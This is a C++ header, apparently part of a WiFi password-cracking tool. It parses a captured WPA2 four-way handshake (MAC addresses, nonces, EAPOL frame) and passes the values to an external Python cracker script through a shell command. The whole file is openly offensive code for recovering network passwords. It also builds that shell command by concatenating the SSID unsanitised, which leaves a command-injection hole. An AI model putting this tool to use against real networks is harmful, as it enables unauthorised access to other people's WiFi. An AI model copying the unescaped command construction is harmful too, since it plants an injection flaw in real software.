#ifndef WIFI_PASSWORD_CRACKER_WPA2_H
#define WIFI_PASSWORD_CRACKER_WPA2_H

#include "control.h"

string hwAddrToHex(const string& hwAddr) {
    string hexStr;
    for(const char& c: hwAddr) {
        if(c != ':')
            hexStr += c;
    }
    return hexStr;
}

char hexmap[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};

string uint8ToHex(const uint8_t* byteArr, int len) {
    string str(2 * len,' ');
    for(int i = 0; i < len; ++i) {
        str[2*i] = hexmap[(byteArr[i] & 0xF0) >> 4];
        str[2*i + 1] = hexmap[byteArr[i] & 0x0F];
    }
    return str;
}

string int8ToHex(vector<uint8_t> byteVec) {
    string str(2 * byteVec.size(),' ');
    for(int i = 0; i < byteVec.size(); ++i) {
        str[2*i] = hexmap[(byteVec[i] & 0xF0) >> 4];
        str[2*i + 1] = hexmap[byteVec[i] & 0x0F];
    }
    return str;
}

string crackWPA2(const string& SSID) {
    FileSniffer fileSniffer("../files/eapol-" + SSID);
    Dot11Data* dataEapol[4];
    for(auto& i: dataEapol) {
        i = ((PDU*) fileSniffer.next_packet())->find_pdu<Dot11Data>();
    }

    string apMac = hwAddrToHex(dataEapol[0]->addr2().to_string());
    string staMac = hwAddrToHex(dataEapol[0]->addr1().to_string());

    string apNonce = uint8ToHex(dataEapol[0]->find_pdu<RSNEAPOL>()->nonce(), 32);
    string staNonce = uint8ToHex(dataEapol[1]->find_pdu<RSNEAPOL>()->nonce(), 32);

    auto* eapol4 = dataEapol[3]->find_pdu<RSNEAPOL>();
    string eapol = int8ToHex(eapol4->serialize());

    string pyCmd = "python3 ../wpa2-cracker.py " + SSID + " " + apMac + " " + staMac + " "
            + apNonce + " " + staNonce + " " + eapol;

    auto startWPA2 = steady_clock::now();
    string password = exec(pyCmd.c_str());
    unsigned int wpa2Time = duration_cast<milliseconds>(steady_clock::now() - startWPA2).count();

    if(password.empty())
        cout << "password not in list  ";
    else
        cout << "password: [" << password << "]  ";
    cout << "[" << wpa2Time << "ms]" << "\n" << endl;
    return password;
}

#endif //WIFI_PASSWORD_CRACKER_WPA2_H
